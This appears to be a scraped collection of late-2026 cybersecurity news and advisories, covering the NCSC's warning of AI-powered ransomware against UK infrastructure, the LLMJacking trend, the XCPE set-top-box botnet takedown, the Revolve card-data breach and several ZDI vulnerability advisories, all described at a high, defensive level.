articles.title: Cyber chief: UK facing AI-powered attacks on critical infrastructure within two years
articles.context: AI-powered malware highly likely to be used in ransomware attack on Britain’s critical national infrastructure by 2028, new report warns
articles.full_text:
AI-powered malware highly likely to be used in ransomware attack on Britain’s critical national infrastructure by 2028, new report warns.

Head of GCHQ’s National Cyber Security Centre to warn, as a society, the era of “tech on the cheap” at expense of security is over.

New State of the Cyber Nation report calls on organisations to make “significant changes” to avert future where AI is used against UK economy and society.

The UK’s critical national infrastructure should be braced for a ransomware attack involving AI-powered malware by 2028, a new report published today [Tuesday 3 November] by the National Cyber Security Centre (NCSC) – a part of the UK’s signals intelligence agency GCHQ says.

The NCSC's State of the Cyber Nation warns that within the next two years, AI adoption by hostile actors is “highly likely” to increase the scale and efficiency of their operations, including ransomware attacks, social engineering, and vulnerability exploitation.

In a speech to launch the report, the CEO of the NCSC, Dr Richard Horne, is set to say that the AI revolution must force UK organisations to reckon with the current state of their cyber security, as new technologies will expose vulnerabilities, failings and underinvestment at an unprecedented speed and scale in the years ahead. The head of the UK's cyber agency will also set out how artificial intelligence represents the critical opportunity to improve the UK’s collective cyber resilience, but that organisations must take urgent action to address foundational investments and weaknesses or risk adversaries exploiting them instead.

The warning comes as the government is investing in the UK's defence and resilience capabilities, including greater investment in cyber defence, while taking action through the introduction of the Cyber Security and Resilience Bill and the forthcoming National Cyber Action Plan to strengthen the UK's defences, deter hostile state aggression, keep essential services running and keep the British people safe.

Alongside calls for organisations to strengthen their resilience, last week the Chancellor also announced greater investment in capabilities to help the UK harness AI for cyber defence, including £60 million into developing the first phase of a national Cyber Shield, £70 million for a new National Exposure and Real-Time Vulnerability (NERV) Centre to identify vulnerabilities across critical infrastructure and the economy, and a new AI Cyber Security Centre of Excellence, ran by the National Cyber Security Centre, in Manchester to develop world leading AI security expertise within government.

This year’s report suggests that the UK is at a point of “enormous consequence” for cyber security and that organisations across the UK must make use of the tools, standards and frameworks that already exist and are evidenced to protect them from conventional and AI-powered cyber attacks.

The NCSC is imploring organisations across the UK to face what Dr Horne is calling “a moment of choice”. In a speech to launch the report, NCSC CEO is expected to say:

In the coming months, we face a real prospect of an unprecedented rise in the number of cyber incidents. But we must be clear that is not because AI has invented new ways to attack us. But because vulnerabilities that have been tolerated for far too long can now be discovered and exploited at a scale that was once unimaginable.

“For decades, we have collectively got away with doing tech on the cheap.

“We can be a nation where leaders of all organisations actively choose to invest with urgency... And where all organisations make security and resilience a fundamental requirement, not an afterthought.

“The collective result would be a source of enduring national strength for us all.

Dr Horne will urge all organisations across the country to “take the responsibility now to make different choices”, including addressing the failure to adequately invest in their technology; not having technology unnecessarily connected to the internet; and making Cyber Essentials the starting point for cyber security, not the end goal, with organisations building greater resilience according to their size, complexity and risk.

He will say that failing to make these choices will result in leaders “having to look their investors, shareholders, employees, customers, suppliers, in the eye and explain...when food isn’t on shelves, lights aren’t on, businesses have gone under.”

In their tenth year, the National Cyber Security Centre plays a more important role than ever before, defending our security on the cyber frontline.

“The NCSC's latest annual report shows cyber threats are growing more sophisticated. We're using the power of AI to help stay ahead of those who seek to do us harm, with a new national Cyber Shield and an AI Cyber Security Centre of Excellence.

articles.title: Artificial intelligence and cyber intrusion
articles.context: Defensive AI-cyber tools have reduced the window of a vulnerability moving from zero-day to an n-day vulnerability, and has made patching a quicker process
articles.full_text:
In 2028, the AI-cyber threat landscape facing the UK has almost certainly increased. Geopolitical tensions highly likely remain high, and nation states are almost certainly leveraging AI-powered cyber capabilities to project power and achieve strategic objectives.

State-sponsored actors, such as China and Russia, highly likely remain the greatest threat, through their developing AI capabilities. China, despite some quality lag in its chip development, has made significant strides in AI capabilities, with a focus on developing its own indigenous technologies. However, the increasing efficiency of AI models has reduced its dependence on cutting-edge western chip technology.

Meanwhile, it is highly likely that Russian cyber actors have leveraged open-source AI models, adapting and retraining them to suit their intelligence requirement needs, rather than developing in-house capabilities from scratch. This approach has allowed Russia to maintain a significant cyber capability without investing heavily in AI research and development. This has highly likely led to an increase in pre-positioning, espionage and intellectual property theft against UK interests.

The widespread availability of AI-powered cyber tools has almost certainly led to a significant increase in the discovery of zero-day vulnerabilities. Defensive AI-cyber tools have reduced the window of a vulnerability moving from zero-day to an n-day vulnerability, and has made patching a quicker process. However, without correct and widespread configuring of this technology, many systems are still vulnerable to attackers using AI-cyber tools to identify and exploit system weaknesses. Additionally, an organisation’s internal patching and testing processes will need to evolve to meet the pace of accelerating vulnerability discovery. Attackers have subsequently displayed less caution over losing an access to achieve an objective, as the cost to replace is minimal. Cyber capabilities are now used for a broader range of activity due to the lower risk involved, making it easier for adversaries to access information and use it operationally.

In 2028, it is likely that attackers will apply AI-cyber capability against known vulnerabilities in CNI legacy tech and the new opportunities in the attack surface provided by the deployment of AI tools within CNI. The use of AI within CNI has almost certainly presented an increased attack surface for adversaries to exploit. UK CNI has likely seen an increased volume of sophisticated attacks as the result of AI-cyber tools, some combatted by defensive AI tools, but implementation of defensive capabilities in UK CNI lags behind offensive ones.

articles.title: CISA Adds One Known Exploited Vulnerability to Catalog
articles.context: CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation
articles.full_text:
CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation.

CVE-2026-119977 WordPress Core Time-of-check Time-of-use (TOCTOU) Race Condition Vulnerability

This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.

Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.

While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria.

Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form. Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities.

When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.

CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies.

CISA also recommends users take the following measures to protect themselves from social engineering attacks:

Do not click web links or open attachments in unsolicited email messages.

Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams.

Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks.

articles.title: NCSC Chief Warns of Imminent AI Ransomware Threat to UK Critical Infrastructure
articles.context: AI-powered malware is strongly expected to feature in ransomware attacks on the UK’s critical national infrastructure by 2028, the country’s National Cyber Security Centre...
articles.full_text:
AI-powered malware is strongly expected to feature in ransomware attacks on the UK’s critical national infrastructure by 2028, the country’s National Cyber Security Centre (NCSC) has warned.

The country faces “a real prospect of an unprecedented rise in the number of cyber incidents,” NCSC CEO Richard Horne said during the launch event for the agency’s annual State of the Cyber Nation report in London, on November 3.

Horne said this heightened threat is supercharged by the use of AI, whose impact “will be felt by us all, whether you and your organization choose to harness it or not.”

The report warned that AI-powered malicious software is “highly likely” to be used in cyber-attacks conducted by financially motivated hackers against the UK’s power stations, airports and hospitals by 2028.

It also warned that nation states including Russia and China will routinely use AI in their cyber activity to achieve their geopolitical goals.

Yet, Horne emphasized that AI-based threats have not fundamentally revealed anything new.

The risk that looms is “not because AI has invented new ways to attack us,” he argued, but “because vulnerabilities that have been tolerated for far too long can now be discovered and exploited at a scale that was once unimaginable.”

He pointed to “far too many organizations” relying on “tech on the cheap.”

“End-of-life systems kept running for just one more year, well-needed upgrades pushed back, as a 'cost efficiency' and technology providers failing to invest in security by design and default,” Horne outlined.

“We have installed technology then failed to invest in it throughout its lifecycle. Granted access where it was convenient rather than where it was necessary. Procured services based solely on their price without asking whether the technologies and operations underpinning them was resilient or secure. And failed to put in place the monitoring needed to detect when things go wrong,” he added.

UK Government Announces New Cybersecurity Investments

The best recent example, Horne said, is the threat of the PHP2Shell vulnerabilities. He noted that his agency has issued 110,000 proactive notifications and Early Warning alerts to UK organizations in response to the PHP vulnerabilities.

He also welcomed recent news that the British government has invested £60m ($80.4m) into developing the first phase of a national Cyber Shield, including a £25m ($33.5m) Challenge Fund supporting UK AI and cyber security innovators, and £70m ($93.8m) for a new National Exposure and Real-Time Vulnerability (NERV) Centre.

These announcements, made on October 24, come alongside an additional £120m ($160.8m) investment in the AI Security Institute (AISI) and the establishment of new AI Cyber Security Centre of Excellence, ran by the NCSC in Manchester to provide world leading AI security expertise within government.

The government has also committed £40m ($53.6m) to establishing a National Agentic Security Unit to monitor and respond to uncontrolled AI bots, alongside a further £24m ($32.1m) to strengthen public-sector cyber defenses using advanced AI technology.

Alongside these investments, Cyber Security Minister, Baroness Lloyd, announced in a speech at the NCSC Annual Review event that the UK government is offering a 75% discount on Cyber Essentials certification for micro, small and medium-sized businesses, bringing the cost down to between £80 ($107) and £125 ($168), plus VAT.

More than 230 businesses have also signed up to the government's Cyber Resilience Pledge, which will allow participating organizations to refer SMEs in their supply chains for free Cyber Essentials certification, with selected businesses also receiving support from a free cyber security advisor.

The government also announced 14 new Software Security Ambassadors, including Fortinet, Thales, Capgemini and Zscaler, which will work with the government to promote secure software development and encourage wider adoption of its Software Security Code of Practice.

A “Moment of Choice” for UK Organizations

Horne said UK organizations and at “a moment of choice” and urged them to “reckon with the current state of their cybersecurity” as new technologies like AI will expose vulnerabilities, failings and underinvestment at an unprecedented speed and scale in the years ahead.

The NCSC report also suggested that the UK is at a point of “enormous consequence” for cybersecurity and that organizations must make use of the tools, standards and frameworks that already exist and are evidenced to protect them from conventional and AI-powered cyber-attacks.

"We can be a nation where leaders of all organizations actively choose to invest with urgency and where all organizations make security and resilience a fundamental requirement, not an afterthought. The collective result would be a source of enduring national strength for us all,” Horne said in his speech.

He added that failing to make these choices will result in leaders “having to look their investors, shareholders, employees, customers, suppliers, in the eye and explain, when food isn’t on shelves, lights aren’t on, businesses have gone under.”

Commenting on the report, Anthony Young, CEO at UK-based critical infrastructure security provider Bridewell, stressed that the NCSC’s two-year warning “feels generous.”

“AI is already helping attackers, and vulnerability discovery is accelerating faster than many organizations can test and deploy patches. There is no time to wait when so many of the weaknesses attackers can exploit are already there, highlighting the recent attacks on supermarket refrigeration systems are a good example of this and “an extension of the problems we have seen for years with internet-connected CCTV and heating or ventilation systems.”

“Organizations cannot assume that insurance will resolve the consequences of an attack when essential services are disrupted. Cyber Essentials matters because so many attacks still exploit basic weaknesses, and leaving those weaknesses in place makes life too easy for everyone from amateur hackers to nation-state attackers. We’ve spent 25 years telling organisations to get the basics right. AI is making it harder for them to get away with ignoring that advice,” Young added.

The warnings come as the UK government is taking action through the introduction of the Cyber Security and Resilience Bill and the forthcoming National Cyber Action Plan to strengthen the UK's defenses.

In this article

Fashion retailer Revolve said customers’ payment card numbers and expiration dates were stolen

Data at risk includes card numbers and expiration dates, customer names and addresses

Affected customers should watch their statements and consider asking issuers for new cards

Online fashion retailer Revolve Group said customers’ payment card numbers and expiration dates were stolen. In its customer notification letter filed with the Massachusetts Attorney General, Revolve told recipients the incident involved their names, addresses, and payment card details.

What was stolen?

The at-risk data includes customer names and contact information, payment card numbers, and card expiration dates. The breach only affected customers who had saved their payment card as a payment method in their Revolve account.

A filing on the Texas attorney general data breach website lists 127,200 affected Texans, but not a nationwide total. We found the figure of 1,515,073 in data returned by the site when searching for Revolve. That data labels it as the total number of people affected, but the figure isn’t displayed on the public listing. Other sites have repeated it, though they appear to rely on the same Texas record. The SEC filing did not give a number of affected people, and Revolve has not confirmed the total.

Revolve’s SEC filing does not mention card verification value (CVV) numbers. These three-digit security codes printed on the back of payment cards (four digits on the front for American Express cards) are an extra layer of security for card-not-present transactions.

It is also unclear whether the card numbers were fully visible or masked, or whether Revolve or a third-party payment processor held them.

Even without a CVV, card numbers and expiration dates may be enough to make purchases at some online stores. And scammers who know your real card details and contact information may be able to send more convincing phishing messages to trick you into revealing your CVV.

How did they get the data?

Revolve has not said how the attackers accessed the saved payment data. In its SEC filing, Revolve said it believes an unauthorized actor may have obtained the data “through automated means.” Records on the Texas attorney general’s site indicate that the incident happened on September 11 and was discovered on September 29.

No group has publicly claimed responsibility for the theft.

What Revolve customers can do now

Revolve said it has taken extra security measures following the breach, although didn’t say what those are.

Breaches happen every day. Don’t be the last to know.

SEE PLANS

If you have saved payment information in your Revolve account, your details may have been among those stolen. Fraud can often begin within days of a breach. If you’re concerned about your card details being exposed:

Read your statements line by line to identify even small charges that you don’t recognize. Criminals will often make a small charge using stolen card details to see if the card works.

Look for unfamiliar merchant names on your statement.

Report unauthorized charges to the card issuer immediately.

Consider removing saved cards from shopping accounts. You could use a password manager instead, some of which will store autofill data for payment cards.

Ask your card issuer to cancel your card and reissue with a new number so that the old number becomes unusable.

Also, don’t immediately trust calls, texts, or emails about the incident. Scammers can use stolen information to make themselves sound convincing. If someone claims to be calling from your card issuer, call the number printed on your card to check.

If you’re unsure about a message or link, check it with Malwarebytes Scam Guard.

Let’s face it, an incognito window can only do so much. Breaches, dark web trading, credit fraud. Malwarebytes Identity Theft Protection monitors for all of it, alerts you fast, and comes with identity theft insurance.

articles.title: LLMJacking is Costing Some Businesses Up to $1m, Warns Google
articles.context: Google has warned of a growing enterprise threat to AI infrastructure from cybercriminals selling access to large language models (LLMs)
articles.full_text:
Google has warned of a growing enterprise threat to AI infrastructure from cybercriminals selling access to large language models (LLMs).

The tech giant’s Mandiant business said it had responded to multiple incidents so far this year across financial services, retail, technology, and transportation sectors in which “LLMJacking” techniques were discovered.

“Unlike the gradual resource consumption associated with cryptojacking, LLMJacking can generate large spikes in fraudulent cloud charges in a matter of hours,” it warned.

“Across individual incidents, we observed fraudulent charges associated with resource consumption exceeding $100,000 in a single day, with cumulative charges at some organizations reaching $1m before access was revoked.”

Read more on LLMJacking: LLMjacking and Open-Source Tool Abuse Surge in 2024 Cloud Attacks.

The technique itself is not new, but the ecosystem for LLMJacking appears to be maturing.

Threat actors bypass front-end chatbots to target backend model resources, usually via LLM API keys or exposed or stolen cloud identity tokens, including IAM credentials, Service Account keys, GitHub Personal Access Tokens and active session tokens.

From this initial foothold, the threat actors escalate privileges and carry out internal reconnaissance to identify targets and more cloud credentials.

As well as abusing and escalating permissions this way, they might also target vulnerabilities in LLM routing software to escalate privileges, the report explained.

“The ultimate objective of LLMJacking is the monetization and resource-hijacking of foundation models, which actors achieve through token proxying, automated model streaming and GPU hardware provisioning,” it added.

A Long-Term Money Spinner

Google has already seen “a diverse set” of financially motivated cybercrime clusters LLMJacking across North America, South America, and Asia Pacific. It has also started to notice a “division of labor” between threat actors that focus on initial access and those monetizing downstream infrastructure, known as “LLM Mixers.”

These routing gateways “proxy, aggregate and resell” access to LLMs for criminal customers.

The work is so lucrative that Google expects cybercriminals will prioritize LLMJacking over cryptojacking going forward.

“As enterprises integrate higher-tier models and agentic workflows into production environments, cybercriminals will likely refine automated reconnaissance to target exposed API tokens and exploit vulnerabilities in model routing middleware,” it concluded.

“This operational specialization will sustain a growing illicit resale marketplace, allowing threat actors to rapidly siphon enterprise quotas while passing the billing costs to victims before compromises are detected.”

articles.title: Police and Tech Firms Team Up to Dismantle XCPE Botnet
articles.context: “We found this malicious software built directly into many different device models and brands over multiple years, supported by dedicated infrastructure and constantly evolving...
articles.full_text:
Google has banned a Chinese Android device maker and worked with partners to dismantle a botnet it helped to build containing more than 1.3 million set-top boxes, the tech giant has revealed.

In a blog post published on November 2, the Google Threat Intelligence Group (GTIG) said it assessed “with high confidence” that Android ODM/OEM Videostrong Technology was responsible for the XCPE botnet and backdoor.

“Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices,” it explained.

“These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices.”

Read more on botnets: Chinese Botnet Bypasses MFA in Microsoft 365 Attacks.

The industry action also disrupted XCPE command-and-control (C2) servers being used by criminal affiliates of Videostrong to install over a dozen malware families onto victims’ devices. This action helped to sever control of over 10 million of these compromised devices from the bot-herders, Google claimed.

“We found this malicious software built directly into many different device models and brands over multiple years, supported by dedicated infrastructure and constantly evolving configurations to evade detection and manage their affiliates,” the blog continued.

“We believe this campaign wasn’t an isolated rogue insider or a development oversight. As a result, Google has cut ties with Videostrong and banned them from making devices with preloaded Google apps.”

Aside from set-top boxes, the XCPE botnet included compromised telehealth devices, karaoke machines, and digital signage devices.

How XCPE Worked

Google claimed Videostrong had been selling devices with the XCPE backdoor embedded into the firmware for several years.

The backdoor itself, x.cpe, operated at android.uid.system privilege level and automatically reinstalls itself from the /oem/ partition on reboot if a user tries to get rid of it.

On startup it contacts a C2 server and uses MQTT message broker for commands, enabling affiliates to remotely perform malicious actions such as executing shell scripts, disabling Google Play Protect, and silently installing additional apps.

Videostrong sought to further monetize the backdoor access to compromised devices by installing malware modules from other operators including residential proxy service providers like Linkfog, AppSalt/Honeygain, GaGaNode, NetNut and Traffmonetizer.

These are another popular enabler of cybercrime including account takeover, payment fraud, ad/click fraud, web scraping and DDoS.

"While we believe our actions have seriously impacted over a dozen malicious actors, the underlying illicit market is resilient,” Google warned in closing.

“Backdoor operators, ad-fraud rings, and residential proxy providers operate as an interconnected supply chain, and when one component is disrupted, operators quickly pivot to new loaders or rival monetization SDKs. Creating lasting change requires accountability across the hardware supply chain, the residential proxy industry and the broader technology ecosystem.”

articles.title: ZDI-26-868: Microsoft Windows Aero Theme Improper Handling Of Error Condition Denial-of-Service Vulnerability
articles.context: An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability
articles.full_text:
Vulnerability Details

This vulnerability allows local attackers to create a denial-of-service condition on affected installations of Microsoft Windows. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.

The specific flaw exists within the handling of Aero themes. The issue results from improper handling of an error condition. An attacker can leverage this vulnerability to create a persistent denial-of-service condition on the system.

Additional Details

Microsoft has issued an update to correct this vulnerability. More details can be found at: https://support.microsoft.com/en-us/servicing/os/windows-11/2026/10/kb5127648-windows-11-24h2-25h2-26h2-security-update

Disclosure Timeline

2026-05-28 - Vulnerability reported to vendor

2026-11-03 - Coordinated public release of advisory

2026-11-03 - Advisory Updated

articles.title: ZDI-26-867: Cisco Snort sf_unfold_header Out-Of-Bounds Write Remote Code Execution Vulnerability
articles.context: Vulnerability Details This vulnerability allows remote attackers to execute arbitrary code on affected installations of Cisco Snort
articles.full_text:
Vulnerability Details

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Cisco Snort. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the processing of HTTP response bodies containing ZIP archives. The issue results from the lack of proper validation of user-supplied data, which can result in a write past the end of an allocated buffer. An attacker can leverage this vulnerability to execute code in the context of the Snort service account.

Additional Details

Cisco has issued an update to correct this vulnerability. More details can be found at: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hardening-snort3-ybgmhTQe

Disclosure Timeline

articles.title: ZDI-26-864: Quest Foglight for Databases getSource XML External Entity Processing Information Disclosure Vulnerability
articles.context: Vulnerability Details This vulnerability allows remote attackers to initiate arbitrary server-side requests on affected installations of Quest Foglight for Databases
articles.full_text:
Vulnerability Details

This vulnerability allows remote attackers to initiate arbitrary server-side requests on affected installations of Quest Foglight for Databases. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the getSource method. Due to the improper restriction of XML External Entity (XXE) references, a crafted document specifying a URI causes the XML parser to access the URI and embed the contents back into the XML document for further processing. An attacker can leverage this vulnerability to disclose information in the context of the application.

Additional Details
